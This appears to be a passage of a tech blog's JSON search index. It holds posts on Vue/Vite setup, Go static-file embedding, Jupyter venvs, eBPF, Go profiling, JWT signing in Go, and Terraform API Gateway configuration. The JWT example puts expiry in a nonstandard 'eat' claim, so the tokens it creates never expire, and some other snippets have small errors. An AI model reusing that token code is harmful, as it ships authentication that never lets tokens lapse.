","link":"https://blog.wisekee.com/post/aws-jsii-getting-started/","section":"post","tags":["CDK","AWS","Jsii"],"title":"Use AWS jsii to cross language invoker"},{"body":"The vue cli 1 2npm i -g @vue/cli 3vue --version 4vue create vue-starter-project 5 6# create local development configuration file 7touch .env.development Use NODE_ENV to switch build or compiler and coding 1# can define the different environment file 2touch .env.development.local # to local testing for development don\u0026#39;t commit the git 3touch .env.staging # to staging environment to configuration 4 5# The env file content may be 6echo \u0026#39;NODE_ENV=\u0026#34;staging\u0026#34;\u0026#39; 7 8# integration the env file to launch 9# { 10# ... 11# \u0026#34;scripts\u0026#34;: { 12# ... 13# \u0026#34;staging\u0026#34;: \u0026#34;vue-cli-service serve --mode staging\u0026#34;, 14# }, 15# ... 16# } Loading mock data according env 1\u0026lt;script\u0026gt; 2import DevData from \u0026#39;../data/airports.development.mock\u0026#39; 3import StagingData from \u0026#39;../data/airports.staging.mock\u0026#39; 4 5export default { 6 name: \u0026#39;App\u0026#39;, 7 computed: { 8 airports() { 9 if (process.env.NODE_ENV === \u0026#39;development\u0026#39;) return DevData 10 else return StagingData 11 } 12 } 13} 14\u0026lt;/script\u0026gt; The vite cli 1npm create vite@latest 2pnpm create vite 3 4# npm 7+, extra double-dash is needed: 5npm create vite@latest my-vue-app -- --template vue 6 7# yarn 8yarn create vite my-vue-app --template vue 9 10# pnpm 11pnpm create vite my-vue-app --template vue 12 13# bun 14bunx create-vite my-vue-app --template vue 15 16npx degit user/project#main my-project 17cd my-project 18 19npm install 20npm run dev add alias resolv in vite.config.js The first manner 1export default defineConfig({ 2 plugins: [vue()], 3 resolve: { 4 alias: { 5 \u0026#39;@\u0026#39;: \u0026#39;/src\u0026#39;, 6 }, 7 }, 8}) The second manner 1import { fileURLToPath, URL } from \u0026#39;node:url\u0026#39; 2 3import { defineConfig } from \u0026#39;vite\u0026#39; 4import vue from \u0026#39;@vitejs/plugin-vue\u0026#39; 5 6// https://vitejs.dev/config/ 7export default defineConfig({ 8 plugins: [vue()], 9 resolve: { 10 alias: { 11 \u0026#39;@\u0026#39;: fileURLToPath(new URL(\u0026#39;./src\u0026#39;, import.meta.url)) 12 } 13 } 14}) Reference Creating environments with modes How To Navigate Between Views with Vue Router 5 Vue.js Mistakes You Should Avoid (and How to Fix Them) ","link":"https://blog.wisekee.com/post/vue-app-getting-started/","section":"post","tags":["Frontend","Vue","Vite"],"title":"How to create sample frontend in vue use cli and vite"},{"body":"The golang code to embed file to compile file use the annotatioins to embed folder, this should embed current public folder to binary file\n1 2import ( 3\t\u0026#34;embed\u0026#34; 4 \u0026#34;fmt\u0026#34; 5 \u0026#34;os\u0026#34; 6 \u0026#34;io/fs\u0026#34; 7\t\u0026#34;net/http\u0026#34; 8 \u0026#34;os/signal\u0026#34; 9\t\u0026#34;runtime\u0026#34; 10\t\u0026#34;strings\u0026#34; 11\t\u0026#34;syscall\u0026#34; 12) 13 14 15//go:embed public 16var staticFiles embed.FS 17 18 19func main() { 20 public, _ := fs.Sub(staticFiles, \u0026#34;public\u0026#34;) 21\t// handle static files include HTML, CSS and JavaScripts. 22\thttp.Handle(\u0026#34;/\u0026#34;, http.FileServer(http.FS(public))) 23 24 go func() { 25\terr = http.ListenAndServe(\u0026#34;127.0.0.1:3000\u0026#34;, nil) 26\tif err != nil { 27\tfmt.Println(\u0026#34;Cant start server:\u0026#34;, err) 28\tos.Exit(1) 29\t} 30\t}() 31 handleSignals() 32} 33 34// handleSignals handle kill signal. 35func handleSignals() { 36\tc := make(chan os.Signal, 1) 37\tsignal.Notify(c, os.Interrupt, syscall.SIGINT, syscall.SIGTERM, syscall.SIGKILL) 38\t\u0026lt;-c 39} if use fiber framework can also to do this the static.go in web frontend folder, the frontend code should compile to ui folder 1package frontend 2 3import \u0026#34;embed\u0026#34; 4 5var ( 6\t//go:embed ui 7\tFileSystem embed.FS 8) 9 10const ( 11\tRootPath = \u0026#34;ui\u0026#34; 12\tIndexPath = RootPath + \u0026#34;/index.html\u0026#34; 13) the vue.config.js file definition 1const { defineConfig } = require(\u0026#39;@vue/cli-service\u0026#39;) 2module.exports = defineConfig({ 3 transpileDependencies: true, 4 // configureWebpack: { 5 // devtool: \u0026#39;inline-source-map\u0026#39; 6 // }, 7 filenameHashing: false, 8\tproductionSourceMap: false, 9\toutputDir: \u0026#39;../ui\u0026#39;, 10\tpublicPath: \u0026#39;/\u0026#39;, 11}) serve the frontend golang code 1package api 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;io/fs\u0026#34; 6\t\u0026#34;net/http\u0026#34; 7 static \u0026#34;example/frontend\u0026#34; 8 \u0026#34;github.com/gofiber/fiber/v2\u0026#34; 9 fiberfs \u0026#34;github.com/gofiber/fiber/v2/middleware/filesystem\u0026#34; 10) 11 12 13func createRoute() { 14 app := fiber.New(fiber.Config{ 15\tErrorHandler: func(c *fiber.Ctx, err error) error { 16\tlog.Warn().Msgf(\u0026#34;[api.ErrorHandler] %s\u0026#34;, err.Error()) 17\treturn c.Status(fiber.StatusInternalServerError).JSON(GlobalErrorHandlerResp{ 18\tSuccess: false, 19\tMessage: err.Error(), 20\t}) 21\t}, 22\tDisableStartupMessage: true, 23\t}) 24 staticFileSystem, err := fs.Sub(static.FileSystem, static.RootPath) 25\tif err != nil { 26\tpanic(err) 27\t} 28 29\tapp.Use(\u0026#34;/\u0026#34;, fiberfs.New(fiberfs.Config{ 30\tRoot: http.FS(staticFileSystem), 31\tIndex: \u0026#34;index.html\u0026#34;, 32\tBrowse: true, 33\t})) 34} ","link":"https://blog.wisekee.com/post/golang-web-static-fileserver/","section":"post","tags":["Go","web","frontend"],"title":"Use golang serve the static file embedded to binary file"},{"body":"","link":"https://blog.wisekee.com/tags/web/","section":"tags","tags":null,"title":"web"},{"body":"","link":"https://blog.wisekee.com/tags/ipython/","section":"tags","tags":null,"title":"Ipython"},{"body":"","link":"https://blog.wisekee.com/tags/jupyter/","section":"tags","tags":null,"title":"Jupyter"},{"body":"Installation and use 1pip install jupyterlab 2jupyter lab --app-dir /opt/homebrew/share/jupyter/lab Initialization the venv 1mkdir test-venv 2cd test-venv \u0026amp;\u0026amp; python -m venv . 3source ./bin/activate 4pip install ipykernel 5./bin/python -m ipykernel install --user --name=test-venv How to test the python package in local development Initialization the python package construct 1./ 2 ├── __init__.py 3 ├── sub_packages 4 ├── sub_packages 5 ├── __init__.py Initialization the venv in local global 1python -m venv ~/.venv/global 2source ~/.venv/global/bin/activate 3export PYTHONPATH=/Users/test/python_custome_package/test ","link":"https://blog.wisekee.com/post/how-to-use-jupyter-in-venv/","section":"post","tags":["Jupyter","Ipython"],"title":"Use the jupyter in venv"},{"body":"","link":"https://blog.wisekee.com/tags/bpf/","section":"tags","tags":null,"title":"BPF"},{"body":"Landscape of linux kernel tracing, monitoring,hooking and networking things method, tools.\nInstall essential compiler and kernel source code 1apt-get install clang 2sudo apt-get -y install libbpf-dev 3apt install linux-headers-`uname -r` 4sudo ln -s /usr/include/x86_64-linux-gnu/asm /usr/include/asm 5# download kernel source code corresponding kernel version 6git clone --branch $(uname -r | awk -F- \u0026#39;{print $1}\u0026#39; | awk -F. \u0026#39;{print \u0026#34;v\u0026#34; $1 \u0026#34;.\u0026#34; $2}\u0026#39;) --single-branch https://github.com/torvalds/linux.git The sample bpf code 1#include \u0026lt;linux/bpf.h\u0026gt; 2#define SEC(NAME) __attribute__((section(NAME), used)) 3 4static int (*bpf_trace_printk)(const char *fmt, int fmt_size, 5 ...) = (void *)BPF_FUNC_trace_printk; 6 7SEC(\u0026#34;tracepoint/syscalls/sys_enter_execve\u0026#34;) 8int bpf_prog(void *ctx) { 9 char msg[] = \u0026#34;Hello, BPF World!\u0026#34;; 10 bpf_trace_printk(msg, sizeof(msg)); 11 return 0; 12} 13 14char _license[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;GPL\u0026#34;; Compiler the bpf program 1clang -O2 -target bpf -c bpf_program.c -o bpf_program.o libbpf-bbotstrap libbpf libbpf-bootstrap-github bufcli bpf practice blog BTF sysdig ebpf write eBPF program A thorough introduction to eBPF XDP An introduction to KProbes systemtap pdig Code snippets from the O\u0026rsquo;Reilly book ","link":"https://blog.wisekee.com/post/getting-started-ebpf/","section":"post","tags":["Kernel","BPF"],"title":"Getting started eBPF development"},{"body":"","link":"https://blog.wisekee.com/tags/kernel/","section":"tags","tags":null,"title":"kernel"},{"body":"For checkout the resources usage in golang, this is simple\nAdd the profile code in app 1// Add the flag to arguments to cpu and memory ptoto buffer file store to it 2\trootCmd.PersistentFlags().StringP(\u0026#34;cpuprofile\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;cpu profile file\u0026#34;) 3\trootCmd.PersistentFlags().StringP(\u0026#34;memprofile\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;memory profile file\u0026#34;) 4// whether enable profile 5func enableProfile() { 6\tcpu, _ := rootCmd.Flags().GetString(\u0026#34;cpuprofile\u0026#34;) 7\tmem, _ := rootCmd.Flags().GetString(\u0026#34;memprofile\u0026#34;) 8\tif cpu != \u0026#34;\u0026#34; { 9\tf, err := os.Create(cpu) 10\tif err != nil { 11\tlog.Fatal().Msgf(\u0026#34;Could not create CPU profile: %v\u0026#34;, err) 12\t} 13\tif err := pprof.StartCPUProfile(f); err != nil { 14\tlog.Fatal().Msgf(\u0026#34;Could not start CPU profile: %v\u0026#34;, err) 15\t} 16\t} 17\tif mem != \u0026#34;\u0026#34; { 18\tf, err := os.Create(mem) 19\tif err != nil { 20\tlog.Fatal().Msgf(\u0026#34;Could not create Memory profile: %v\u0026#34;, err) 21\t} 22\truntime.GC() 23\tif err := pprof.WriteHeapProfile(f); err != nil { 24\tlog.Fatal().Msgf(\u0026#34;Could not write memory profile: %v\u0026#34;, err) 25\t} 26\tf.Close() 27\t} 28} Use the Signal to generate the profile 1// registe the signal 2 exitApp := make(chan os.Signal, 1) 3\tsignal.Notify(exitApp, os.Interrupt, syscall.SIGTERM, syscall.SIGUSR1) 4 go listenForInterrupt(exitApp) 5 6 func listenForInterrupt(exitApp chan os.Signal) { 7 switch sig := \u0026lt;-exitApp; sig { 8 case os.Interrupt: 9 log.Fatal().Msg(\u0026#34;Interrupt signal received. Exiting...\u0026#34;) 10 case syscall.SIGUSR1: 11 pprof.StopCPUProfile() //when receive the SIGUSR1 signal to generate the profile 12 log.Warn().Msg(\u0026#34;Stop the cpu profile\u0026#34;) 13 default: 14 log.Fatal().Msgf(\u0026#34;Unexpected signal %v received. Exiting...\u0026#34;, sig) 15 } 16 cmd.HttpServer.Shutdown(context.TODO()) 17 } Copy the pprof file to local and analysis use go tool pprof 1# send the signal to terminate to profile 2kill -USR1 xxxxx 3# copy pprof from pod container to local 4kubectl cp namespace/pod-xxxxx-name:/tmp/cpu.prof ./cpu.pprof 5# launch the analysis tool view in browser 6go tool pprof -http=\u0026#34;:8080\u0026#34; cpu.pprof Use trace to view goroutines 1import \u0026#34;runtime/trace\u0026#34; 2 3// Start tracing. 4f, _ := os.Create(\u0026#34;trace.out\u0026#34;) 5trace.Start(f) 6defer trace.Stop() 7 8// open the browser to view 9// go tool trace trace.out Reference oncurrency-in-go-how-it-works-in-real-computing-systems-part-1 ","link":"https://blog.wisekee.com/post/golang_profile/","section":"post","tags":["Go","Profile","PProf"],"title":"How to profile the golang program"},{"body":"","link":"https://blog.wisekee.com/tags/pprof/","section":"tags","tags":null,"title":"PProf"},{"body":"","link":"https://blog.wisekee.com/tags/profile/","section":"tags","tags":null,"title":"Profile"},{"body":"","link":"https://blog.wisekee.com/tags/authorization/","section":"tags","tags":null,"title":"Authorization"},{"body":"Use HS256 or RS256 to sign and authorization is common JWT methods\nCreate the JWT token 1package util 2 3import \u0026#34;github.com/golang-jwt/jwt/v5\u0026#34; 4 5// retrieve JWT key from .env file 6var privateKey = []byte(os.Getenv(\u0026#34;JWT_PRIVATE_KEY\u0026#34;)) 7 8// generate JWT token 9func GenerateJWT(user model.User) (string, error) { 10\ttokenTTL, _ := strconv.Atoi(os.Getenv(\u0026#34;TOKEN_TTL\u0026#34;)) 11\t//log.Println(time.Now()) 12\t//log.Println(time.Now().Add(time.Second * time.Duration(tokenTTL))) 13\ttoken := jwt.NewWithClaims(jwt.SigningMethodHS256, jwt.MapClaims{ 14\t\u0026#34;id\u0026#34;: user.ID, 15\t\u0026#34;role\u0026#34;: user.RoleID, 16\t\u0026#34;iat\u0026#34;: time.Now().Unix(), 17\t\u0026#34;eat\u0026#34;: time.Now().Add(time.Second * time.Duration(tokenTTL)).Unix(), 18\t}) 19\treturn token.SignedString(privateKey) 20} Validate the JWT 1// validate JWT token 2func ValidateJWT(context *gin.Context) error { 3\ttoken, err := getToken(context) 4\tif err != nil { 5\treturn err 6\t} 7\t_, ok := token.Claims.(jwt.MapClaims) 8\tif ok \u0026amp;\u0026amp; token.Valid { 9\treturn nil 10\t} 11\treturn errors.New(\u0026#34;invalid token provided\u0026#34;) 12} 13 14// check token validity 15func getToken(context *gin.Context) (*jwt.Token, error) { 16\ttokenString := getTokenFromRequest(context) 17\ttoken, err := jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { 18\tif _, ok := token.Method.(*jwt.SigningMethodHMAC); !ok { 19\treturn nil, fmt.Errorf(\u0026#34;unexpected signing method: %v\u0026#34;, token.Header[\u0026#34;alg\u0026#34;]) 20\t} 21 22\treturn privateKey, nil 23\t}) 24\treturn token, err 25} 26 27// extract token from request Authorization header 28func getTokenFromRequest(context *gin.Context) string { 29\tbearerToken := context.Request.Header.Get(\u0026#34;Authorization\u0026#34;) 30\tsplitToken := strings.Split(bearerToken, \u0026#34; \u0026#34;) 31\tif len(splitToken) == 2 { 32\treturn splitToken[1] 33\t} 34\treturn \u0026#34;\u0026#34; 35} If use RS256 to sign and verify JWT token generation the PKI 1# The makefile 2.PHONY: cert 3cert: 4\topenssl genrsa -out cert/id_rsa 4096 5\topenssl rsa -in cert/id_rsa -pubout -out cert/id_rsa.pub use the private key to sign token 1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;io/ioutil\u0026#34; 6\t\u0026#34;log\u0026#34; 7\t\u0026#34;time\u0026#34; 8 9\t\u0026#34;github.com/you/client/internal/pkg/token\u0026#34; 10) 11 12func main() { 13\tprvKey, err := ioutil.ReadFile(\u0026#34;cert/id_rsa\u0026#34;) 14\tif err != nil { 15\tlog.Fatalln(err) 16\t} 17\tpubKey, err := ioutil.ReadFile(\u0026#34;cert/id_rsa.pub\u0026#34;) 18\tif err != nil { 19\tlog.Fatalln(err) 20\t} 21 22\tjwtToken := token.NewJWT(prvKey, pubKey) 23 24\t// 1. Create a new JWT token. 25\ttok, err := jwtToken.Create(time.Hour, \u0026#34;Can be anything\u0026#34;) 26\tif err != nil { 27\tlog.Fatalln(err) 28\t} 29\tfmt.Println(\u0026#34;TOKEN:\u0026#34;, tok) 30 31\t// 2. Validate an existing JWT token. 32\tcontent, err := jwtToken.Validate(tok) 33\tif err != nil { 34\tlog.Fatalln(err) 35\t} 36\tfmt.Println(\u0026#34;CONTENT:\u0026#34;, content) 37} use the public key to verify 1package token 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;time\u0026#34; 6 7\t\u0026#34;github.com/dgrijalva/jwt-go\u0026#34; 8) 9 10type JWT struct { 11\tprivateKey []byte 12\tpublicKey []byte 13} 14 15func NewJWT(privateKey []byte, publicKey []byte) JWT { 16\treturn JWT{ 17\tprivateKey: privateKey, 18\tpublicKey: publicKey, 19\t} 20} 21 22func (j JWT) Create(ttl time.Duration, content interface{}) (string, error) { 23\tkey, err := jwt.ParseRSAPrivateKeyFromPEM(j.privateKey) 24\tif err != nil { 25\treturn \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;create: parse key: %w\u0026#34;, err) 26\t} 27 28\tnow := time.Now().UTC() 29 30\tclaims := make(jwt.MapClaims) 31\tclaims[\u0026#34;dat\u0026#34;] = content // Our custom data. 32\tclaims[\u0026#34;exp\u0026#34;] = now.Add(ttl).Unix() // The expiration time after which the token must be disregarded. 33\tclaims[\u0026#34;iat\u0026#34;] = now.Unix() // The time at which the token was issued. 34\tclaims[\u0026#34;nbf\u0026#34;] = now.Unix() // The time before which the token must be disregarded. 35 36\ttoken, err := jwt.NewWithClaims(jwt.SigningMethodRS256, claims).SignedString(key) 37\tif err != nil { 38\treturn \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;create: sign token: %w\u0026#34;, err) 39\t} 40 41\treturn token, nil 42} 43 44func (j JWT) Validate(token string) (interface{}, error) { 45\tkey, err := jwt.ParseRSAPublicKeyFromPEM(j.publicKey) 46\tif err != nil { 47\treturn \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;validate: parse key: %w\u0026#34;, err) 48\t} 49 50\ttok, err := jwt.Parse(token, func(jwtToken *jwt.Token) (interface{}, error) { 51\tif _, ok := jwtToken.Method.(*jwt.SigningMethodRSA); !ok { 52\treturn nil, fmt.Errorf(\u0026#34;unexpected method: %s\u0026#34;, jwtToken.Header[\u0026#34;alg\u0026#34;]) 53\t} 54 55\treturn key, nil 56\t}) 57\tif err != nil { 58\treturn nil, fmt.Errorf(\u0026#34;validate: %w\u0026#34;, err) 59\t} 60 61\tclaims, ok := tok.Claims.(jwt.MapClaims) 62\tif !ok || !tok.Valid { 63\treturn nil, fmt.Errorf(\u0026#34;validate: invalid\u0026#34;) 64\t} 65 66\treturn claims[\u0026#34;dat\u0026#34;], nil 67} Reference Control (RBAC) in Go with jwt-go package Creating and validating a JWT RSA token in Golang ","link":"https://blog.wisekee.com/post/golang-jwt-example/","section":"post","tags":["Go","JWT","Authorization"],"title":"Generation and Verify JWT token in golang"},{"body":"","link":"https://blog.wisekee.com/tags/jwt/","section":"tags","tags":null,"title":"JWT"},{"body":"","link":"https://blog.wisekee.com/tags/apigateway/","section":"tags","tags":null,"title":"apigateway"},{"body":"","link":"https://blog.wisekee.com/tags/cncf/","section":"tags","tags":null,"title":"cncf"},{"body":"","link":"https://blog.wisekee.com/tags/terraform/","section":"tags","tags":null,"title":"terraform"},{"body":"The daigram 1 2mock-restapi.example.dev(route53) -----\u0026gt; apigateway -----\u0026gt; vpclink -------\u0026gt; private aws nlb (eks ingress) ---\u0026gt; app servcie Use Terraform to create apigateway restapi resource to apply the resources and mapping the apigateway domain name to route53 to access the eks services\ncreate the route53 and domain name and vpc link to access eks services 1resource \u0026#34;aws_api_gateway_vpc_link\u0026#34; \u0026#34;to-private-nlb\u0026#34; { 2 name = \u0026#34;to-private-nlb\u0026#34; 3 description = \u0026#34;rest api to private nlb\u0026#34; 4 target_arns = [\u0026#34;arn:aws:elasticloadbalancing:xxxxx:xxxxx:loadbalancer/net/xxxxxx/xxxxxx\u0026#34;] 5} 6 7data \u0026#34;aws_route53_zone\u0026#34; \u0026#34;example_dev\u0026#34; { 8 name = \u0026#34;example.dev.\u0026#34; 9 private_zone = false 10} 11 12resource \u0026#34;aws_api_gateway_domain_name\u0026#34; \u0026#34;mock_restapi_example_dev\u0026#34; { 13 domain_name = \u0026#34;mock-restapi.example.dev\u0026#34; 14 regional_certificate_arn = \u0026#34;arn:aws:acm:xxxxxx:xxxxxxx:certificate/xxxxxx-xxxxxx-xxx-xxxxx\u0026#34; 15 16 endpoint_configuration { 17 types = [\u0026#34;REGIONAL\u0026#34;] 18 } 19} 20 21resource \u0026#34;aws_route53_record\u0026#34; \u0026#34;mock_restapi_example_dev\u0026#34; { 22 name = aws_api_gateway_domain_name.mock_restapi_example_dev.domain_name 23 type = \u0026#34;A\u0026#34; 24 zone_id = data.aws_route53_zone.example_dev.id 25 26 alias { 27 evaluate_target_health = true 28 name = aws_api_gateway_domain_name.mock_restapi_example_dev.regional_domain_name 29 zone_id = aws_api_gateway_domain_name.mock_restapi_example_dev.regional_zone_id 30 } 31} create the rest api resource and method and integration 1resource \u0026#34;aws_api_gateway_rest_api\u0026#34; \u0026#34;mock_rest_api\u0026#34; { 2 name = \u0026#34;mock-rest-api\u0026#34; 3 description = \u0026#34;Testing for integration the private NLB\u0026#34; 4 5 endpoint_configuration { 6 types = [\u0026#34;REGIONAL\u0026#34;] 7 } 8} 9 10resource \u0026#34;aws_api_gateway_resource\u0026#34; \u0026#34;root\u0026#34; { 11 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 12 parent_id = aws_api_gateway_rest_api.mock_rest_api.root_resource_id 13 path_part = \u0026#34;{proxy+}\u0026#34; 14} 15 16 17resource \u0026#34;aws_api_gateway_method\u0026#34; \u0026#34;all\u0026#34; { 18 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 19 resource_id = aws_api_gateway_resource.root.id 20 http_method = \u0026#34;ANY\u0026#34; 21 authorization = \u0026#34;NONE\u0026#34; 22 23 request_parameters = { 24 \u0026#34;method.request.path.proxy\u0026#34; = true 25 } 26} 27 28resource \u0026#34;aws_api_gateway_integration\u0026#34; \u0026#34;vpclink_integration\u0026#34; { 29 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 30 resource_id = aws_api_gateway_resource.root.id 31 http_method = aws_api_gateway_method.all.http_method 32 # request_templates = { 33 # \u0026#34;application/json\u0026#34; = \u0026#34;\u0026#34; 34 # \u0026#34;application/xml\u0026#34; = \u0026#34;#set($inputRoot = $input.path(\u0026#39;$\u0026#39;))\\n{ }\u0026#34; 35 # } 36 37 request_parameters = { 38 \u0026#34;integration.request.path.proxy\u0026#34; = \u0026#34;method.request.path.proxy\u0026#34; 39 # \u0026#34;integration.request.header.X-hpa\u0026#34; = \u0026#34;method.request.header.path\u0026#34; 40 } 41 42 type = \u0026#34;HTTP\u0026#34; 43 uri = \u0026#34;https://private-nlb.example.dev/{proxy}\u0026#34; 44 integration_http_method = \u0026#34;ANY\u0026#34; 45 passthrough_behavior = \u0026#34;WHEN_NO_MATCH\u0026#34; 46 content_handling = \u0026#34;CONVERT_TO_TEXT\u0026#34; 47 48 connection_type = \u0026#34;VPC_LINK\u0026#34; 49 connection_id = aws_api_gateway_vpc_link.to-private-nlb.id 50} Create request and response integration and domain base path mapping to route53 record 1resource \u0026#34;aws_api_gateway_method_response\u0026#34; \u0026#34;all\u0026#34; { 2 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 3 resource_id = aws_api_gateway_resource.root.id 4 http_method = aws_api_gateway_method.all.http_method 5 status_code = \u0026#34;200\u0026#34; 6} 7 8resource \u0026#34;aws_api_gateway_integration_response\u0026#34; \u0026#34;all\u0026#34; { 9 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 10 resource_id = aws_api_gateway_resource.root.id 11 http_method = aws_api_gateway_method.all.http_method 12 status_code = aws_api_gateway_method_response.all.status_code 13 14 depends_on = [ 15 aws_api_gateway_method.all, 16 aws_api_gateway_integration.vpclink_integration 17 ] 18} 19 20resource \u0026#34;aws_api_gateway_base_path_mapping\u0026#34; \u0026#34;mock_rest_api\u0026#34; { 21 api_id = aws_api_gateway_rest_api.mock_rest_api.id 22 domain_name = aws_api_gateway_domain_name.mock_restapi_example_dev.id 23 stage_name = aws_api_gateway_stage.main.stage_name 24 25 26 depends_on = [ 27 aws_api_gateway_deployment.mock_rest_api, 28 aws_api_gateway_stage.main 29 ] 30} create the deployment and stage and method setting to enable logs and metrics 1resource \u0026#34;aws_api_gateway_deployment\u0026#34; \u0026#34;mock_rest_api\u0026#34; { 2 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 3 4 triggers = { 5 redeployment = sha1(jsonencode(aws_api_gateway_rest_api.mock_rest_api.body)) 6 } 7 8 lifecycle { 9 create_before_destroy = true 10 } 11 12 depends_on = [ 13 aws_api_gateway_domain_name.mock_restapi_example_dev, 14 aws_api_gateway_method.all, 15 aws_api_gateway_integration.vpclink_integration 16 ] 17} 18 19resource \u0026#34;aws_api_gateway_stage\u0026#34; \u0026#34;main\u0026#34; { 20 deployment_id = aws_api_gateway_deployment.mock_rest_api.id 21 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 22 stage_name = \u0026#34;main\u0026#34; 23 24 25 depends_on = [ 26 aws_api_gateway_method.all, 27 aws_api_gateway_integration.vpclink_integration 28 ] 29} 30 31resource \u0026#34;aws_api_gateway_method_settings\u0026#34; \u0026#34;mock_rest_api\u0026#34; { 32 rest_api_id = aws_api_gateway_rest_api.mock_rest_api.id 33 stage_name = aws_api_gateway_stage.main.stage_name 34 method_path = \u0026#34;*/*\u0026#34; 35 36 settings { 37 metrics_enabled = true 38 logging_level = \u0026#34;INFO\u0026#34; 39 } 40} Use ACK operator and apigatewayv2 to create to install the ACK operator apigatewayv2 controller 1# login to aws ecr public registry 2aws ecr-public get-login-password --region us-east-1 | helm registry login --username AWS --password-stdin public.ecr.aws 3# pull the apigatewayv2 controller helm chart 4helm pull oci://public.ecr.aws/aws-controllers-k8s/apigatewayv2-chart 5# install the helm chart to eks cluster 6helm install --create-namespace -n ack-system ack-apigatewayv2-controller ./apigatewayv2 --set=aws.region=us-east-1 and create eks crd resources 1apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 2kind: VPCLink 3metadata: 4 name: \u0026#34;mock-httpapi-to--private-nlb\u0026#34; 5 namespace: \u0026#34;default\u0026#34; 6spec: 7 name: \u0026#34;mock-httpapi-to-istio-private-nlb\u0026#34; 8 # securityGroupIDs: 9 # - \u0026#34;\u0026#34; 10 subnetIDs: 11 - \u0026#34;subnet-xxxxxxx\u0026#34; 12 - \u0026#34;subnet-xxxxxxx\u0026#34; 13 - \u0026#34;subnet-xxxxxxx\u0026#34; 14 tags: { \u0026#34;Team\u0026#34;: \u0026#34;xxxxxx\u0026#34;, \u0026#34;Environment\u0026#34;: \u0026#34;Dev\u0026#34;} 15 16--- 17apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 18kind: API 19metadata: 20 name: \u0026#34;mock-httpapi-testing\u0026#34; 21 namespace: \u0026#34;default\u0026#34; 22spec: 23 name: \u0026#34;mock-httpapi-testing\u0026#34; 24 protocolType: HTTP 25 26--- 27apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 28kind: Integration 29metadata: 30 name: \u0026#34;mock-httpapi-testing\u0026#34; 31 namespace: \u0026#34;default\u0026#34; 32spec: 33 apiRef: 34 from: 35 name: \u0026#34;mock-httpapi-testing\u0026#34; 36 integrationType: HTTP_PROXY 37 integrationURI: \u0026#34;arn:aws:elasticloadbalancing:us-east-1:xxxxxxxx:listener/net/istio-private-ingress-gateway/xxxxx/xxxxxx\u0026#34; 38 connectionType: \u0026#34;VPC_LINK\u0026#34; 39 connectionRef: 40 from: 41 name: \u0026#34;mock-httpapi-to-istio-private-nlb\u0026#34; 42 integrationMethod: ANY 43 payloadFormatVersion: \u0026#34;1.0\u0026#34; 44--- 45apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 46kind: Authorizer 47metadata: 48 name: \u0026#34;mock-httpapi-testing\u0026#34; 49 namespace: \u0026#34;default\u0026#34; 50spec: 51 name: \u0026#34;mock-httpapi-testing\u0026#34; 52 apiRef: 53 from: 54 name: \u0026#34;mock-httpapi-testing\u0026#34; 55 authorizerType: \u0026#34;JWT\u0026#34; 56 identitySource: 57 - \u0026#34;$request.header.Authorization\u0026#34; 58 jwtConfiguration: 59 audience: 60 - \u0026#34;openid\u0026#34; 61 issuer: \u0026#34;https://service.xxxxxxx.dev/sso\u0026#34; 62--- 63apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 64kind: Route 65metadata: 66 name: \u0026#34;mock-httpapi-testing\u0026#34; 67 namespace: \u0026#34;default\u0026#34; 68spec: 69 apiRef: 70 from: 71 name: \u0026#34;mock-httpapi-testing\u0026#34; 72 routeKey: \u0026#34;ANY /{proxy+}\u0026#34; 73 targetRef: 74 from: 75 name: \u0026#34;mock-httpapi-testing\u0026#34; 76 authorizationType: \u0026#34;JWT\u0026#34; 77 authorizerRef: 78 from: 79 name: \u0026#34;mock-httpapi-testing\u0026#34; 80--- 81apiVersion: apigatewayv2.services.k8s.aws/v1alpha1 82kind: Stage 83metadata: 84 name: \u0026#34;mock-httpapi-testing\u0026#34; 85 namespace: \u0026#34;default\u0026#34; 86spec: 87 apiRef: 88 from: 89 name: \u0026#34;mock-httpapi-testing\u0026#34; 90 stageName: \u0026#34;main\u0026#34; 91 autoDeploy: true 92 description: \u0026#34;auto deployed stage for mock-httpapi-testing\u0026#34; Caution the apigateway has restricts The ACK support HTTP APIS and WebSocket API current only ACK service integration the apigatewayv2 with EKS apigatewayv2 support (http api, websocket api), apigateway support(Rest api) While HTTP APIs are designed with minimal features so that they can be offered at a lower price. Choose REST APIs if you need features such as API keys, per-client throttling, request validation, AWS WAF integration, or private API endpoints. Choose HTTP APIs if you don\u0026rsquo;t need the features included with REST APIs. REST API vs HTTP API Maximum integration timeout: 30s (No Increased) Payload size(10MB) (No Increased) Timeout for Lambda authorizer response(10s No increased) References cloudformation defination the schema definiation ","link":"https://blog.wisekee.com/post/aws-apigateway-practice/","section":"post","tags":["apigateway","cncf","terraform"],"title":"Use terraform or ACK apigatewayv2 EKS operator to set up apigateway in AWS"},{"body":"Reference Building a Browser-based Terminal using Docker and XtermJS Docker attach api Kubernetes dashboard terminal Use a WebSocket client to exec commands in a Kubernetes pod ","link":"https://blog.wisekee.com/post/remote-termination-websocket/","section":"post","tags":["websocket","K8s","xtermjs"],"title":"How to connect the pod terminal use web 